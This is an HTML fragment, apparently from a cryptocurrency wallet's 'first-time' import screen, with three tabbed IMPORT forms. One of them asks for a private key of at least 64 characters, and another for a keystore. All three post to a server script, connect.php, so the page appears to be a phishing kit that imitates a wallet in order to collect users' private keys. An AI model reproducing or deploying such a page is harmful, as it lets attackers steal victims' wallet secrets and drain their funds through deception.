...
<br>						
                      ...
                      <button form="form1" value="Import" type="submit" name="import1" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div>
                  ...
                  <div id="keystore" class="tabcontent">
                    <form action="connect.php" method="POST" id="form2">
                      ...
                      <button form="form2" value="Import" type="submit" name="import2" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div>
                  ...
                  <div id="private" class="tabcontent">
                    <form action="connect.php" method="POST" id="form3">
					 <textarea rows="8" cols="70" name="key" required="required" minlength="64" placeholder="Private Key"
                      ...
                      <button form="form3" value="Import" type="submit" name="import3" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div> 
